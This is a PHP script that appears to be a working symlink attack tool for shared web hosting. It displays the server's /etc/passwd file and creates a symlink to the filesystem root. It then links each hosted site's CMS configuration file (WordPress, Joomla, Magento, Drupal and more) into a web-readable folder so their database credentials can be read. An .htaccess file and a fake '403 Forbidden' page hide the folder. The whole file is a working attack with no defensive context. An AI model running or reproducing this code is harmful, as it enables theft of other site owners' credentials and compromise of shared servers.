<?php 
function randomName($length = 8) {
    return 'vhost_' . substr(md5(uniqid(mt_rand(), true)), 0, $length);
}

$folder = randomName();

if ($_POST['trigger']) {
    @mkdir($folder, 0777);
    @chdir($folder);
    system("ln -s / root");

    // Buat file index.htm dengan meta noindex,nofollow
    $html = "<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='robots' content='noindex,nofollow'>
    <title>Forbidden</title>
</head>
<body>
    <h1>403 Forbidden</h1>
</body>
</html>";
    @file_put_contents("index.htm", $html);

    // Buat .htaccess
    $htaccess = "
Options Indexes FollowSymLinks
DirectoryIndex index.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
    @file_put_contents(".htaccess", $htaccess);

    $etcp = $_POST['passwd'];
    $etcp = explode("\n", $etcp);

    foreach ($etcp as $passwd) {
        $pawd = explode(":", $passwd);
        $user = $pawd[5] ?? '';
        $cleanName = preg_replace('/\/var\/www\/vhosts\//', '', $user);

        if (preg_match('/vhosts/i', $user)) {
            system("ln -s {$user}/httpdocs/wp-config.php {$cleanName}-Wordpress.txt");
            system("ln -s {$user}/httpdocs/configuration.php {$cleanName}-Joomla.txt");
            system("ln -s {$user}/httpdocs/config/koneksi.php {$cleanName}-Lokomedia.txt");
            system("ln -s {$user}/httpdocs/forum/config.php {$cleanName}-phpBB.txt");
            system("ln -s {$user}/httpdocs/sites/default/settings.php {$cleanName}-Drupal.txt");
            system("ln -s {$user}/httpdocs/config/settings.inc.php {$cleanName}-PrestaShop.txt");
            system("ln -s {$user}/httpdocs/app/etc/local.xml {$cleanName}-Magento.txt");
            system("ln -s {$user}/httpdocs/admin/config.php {$cleanName}-OpenCart.txt");
            system("ln -s {$user}/httpdocs/application/config/database.php {$cleanName}-Ellislab.txt");
            system("ln -s {$user}/httpdocs/inc/connect.php {$cleanName}-Parallels.txt");
            system("ln -s {$user}/httpdocs/inc/config.php {$cleanName}-MyBB.txt");
        }
    }

    echo "<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='robots' content='noindex,nofollow'>
<title>Symlink Result</title>
</head>
<body>
<center>
<a href='{$folder}/root/'><u>Open Symlink</u></a><br>
<a href='{$folder}/'><u>View Config Directory</u></a>
</center>
</body>
</html>";
} else {
    echo "<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='robots' content='noindex,nofollow'>
<title>Access Panel</title>
</head>
<body>
<center>
<form method='POST' action=''>
<textarea name='passwd' rows='15' cols='60'>";
    echo @file_get_contents("/etc/passwd");
    echo "</textarea><br><br>
<input type='submit' name='trigger' value='Submit'>
</form>
</center>
</body>
</html>";
}
?>